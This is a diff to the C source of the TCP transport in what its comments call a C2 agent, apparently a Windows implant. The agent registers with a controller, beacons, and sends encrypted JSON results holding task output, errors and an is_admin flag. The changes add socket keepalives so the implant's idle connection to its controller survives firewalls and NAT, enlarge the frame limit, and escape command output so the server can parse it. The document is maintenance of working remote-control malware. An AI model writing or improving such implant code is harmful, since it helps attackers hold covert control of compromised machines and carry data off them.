@@ -5,6 +5,7 @@
 #include "b64.h"
 #include <winsock2.h>
 #include <windows.h>
+#include <mstcpip.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
@@ -17,6 +18,8 @@
 // Persistent TCP socket (opened during register, reused for beacon/result).
 static SOCKET g_tcp_sock = INVALID_SOCKET;
 
+#define TCP_MAX_FRAME (32u * 1024u * 1024u)
+
 static void tcp_reset(void) {
     if (g_tcp_sock != INVALID_SOCKET) {
         shutdown(g_tcp_sock, SD_BOTH);
@@ -26,6 +29,30 @@ static void tcp_reset(void) {
     memset(g_agent.agent_id, 0, sizeof(g_agent.agent_id));
     memset(g_agent.aes_key, 0, sizeof(g_agent.aes_key));
     g_agent.has_key = 0;
+}
+
+/* Configure the persistent C2 socket so an idle connection is probed instead
+ * of being silently discarded by a firewall/NAT.  Keep the normal socket
+ * options as a fallback because some Windows environments reject the extended
+ * keepalive ioctl. */
+static void tcp_configure_socket(SOCKET s) {
+    BOOL keepalive = TRUE;
+    setsockopt(s, SOL_SOCKET, SO_KEEPALIVE,
+               (const char*)&keepalive, sizeof(keepalive));
+
+    DWORD timeout_ms = 10000;
+    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO,
+               (const char*)&timeout_ms, sizeof(timeout_ms));
+    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO,
+               (const char*)&timeout_ms, sizeof(timeout_ms));
+
+    tcp_keepalive ka;
+    ka.onoff = 1;
+    ka.keepalivetime = 60000;   /* first probe after 60 seconds idle */
+    ka.keepaliveinterval = 10000; /* retry every 10 seconds */
+    DWORD returned = 0;
+    WSAIoctl(s, SIO_KEEPALIVE_VALS, &ka, sizeof(ka),
+             NULL, 0, &returned, NULL, NULL);
 }
 
 static int tcp_send_all(SOCKET s, const uint8_t *data, size_t len) {
@@ -62,7 +89,7 @@ static uint8_t* tcp_read_msg(SOCKET s, size_t *out_len) {
     }
     size_t len=(size_t)hdr[0]|((size_t)hdr[1]<<8)|
                ((size_t)hdr[2]<<16)|((size_t)hdr[3]<<24);
-    if (len==0||len>16*1024*1024) return NULL;
+    if (len==0||len>TCP_MAX_FRAME) return NULL;
     uint8_t *buf=(uint8_t*)malloc(len+1);
     if (!buf) return NULL;
     size_t total=0;
@@ -162,14 +189,50 @@ static SOCKET tcp_connect(void) {
     dst.sin_port   = htons((u_short)port);
     dst.sin_addr.s_addr = inet_addr(host);
 
-    DWORD tv_ms = 10000;
-    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv_ms, sizeof(tv_ms));
+    tcp_configure_socket(s);
 
     if (connect(s, (struct sockaddr*)&dst, sizeof(dst)) != 0) {
         closesocket(s);
         return INVALID_SOCKET;
     }
     return s;
+}
+
+/* Escape command output before embedding it in the encrypted result JSON.
+ * HTTP already goes through the equivalent helper in transport.c; TCP must do
+ * the same because the server parses the decrypted result as JSON. */
+static char* tcp_json_escape(const char *s) {
+    if (!s) s = "";
+    size_t len = strlen(s);
+    if (len > (SIZE_MAX - 1) / 6) return NULL;
+
+    char *out = (char*)malloc(len * 6 + 1);
+    if (!out) return NULL;
+    static const char hex[] = "0123456789abcdef";
+    size_t j = 0;
+    for (size_t i = 0; i < len; i++) {
+        unsigned char ch = (unsigned char)s[i];
+        switch (ch) {
+        case '"': out[j++]='\\'; out[j++]='"'; break;
+        case '\\': out[j++]='\\'; out[j++]='\\'; break;
+        case '\b': out[j++]='\\'; out[j++]='b'; break;
+        case '\f': out[j++]='\\'; out[j++]='f'; break;
+        case '\n': out[j++]='\\'; out[j++]='n'; break;
+        case '\r': out[j++]='\\'; out[j++]='r'; break;
+        case '\t': out[j++]='\\'; out[j++]='t'; break;
+        default:
+            if (ch < 0x20) {
+                out[j++]='\\'; out[j++]='u';
+                out[j++]='0'; out[j++]='0';
+                out[j++]=hex[ch >> 4]; out[j++]=hex[ch & 0x0f];
+            } else {
+                out[j++]=(char)ch;
+            }
+            break;
+        }
+    }
+    out[j] = '\0';
+    return out;
 }
 
 // ── Transport operations ──────────────────────────────────────────────────────
@@ -263,13 +326,28 @@ void transport_tcp_send_result(long long task_id, const char *output,
                                 const char *error, int is_admin) {
     if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return;
 
-    size_t body_sz = (output?strlen(output):0) + (error?strlen(error):0) + 256;
+    char *esc_output = tcp_json_escape(output);
+    char *esc_error  = tcp_json_escape(error);
+    if (!esc_output || !esc_error) {
+        free(esc_output);
+        free(esc_error);
+        tcp_reset();
+        return;
+    }
+
+    size_t body_sz = strlen(esc_output) + strlen(esc_error) + 256;
     char *body = (char*)malloc(body_sz);
-    if (!body) return;
+    if (!body) {
+        free(esc_output);
+        free(esc_error);
+        return;
+    }
     snprintf(body, body_sz,
         "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
-        task_id, output?output:"", error?error:"",
+        task_id, esc_output, esc_error,
         is_admin?"true":"false");
+    free(esc_output);
+    free(esc_error);
 
     if (!tcp_send_enc("result", body)) {
         free(body);
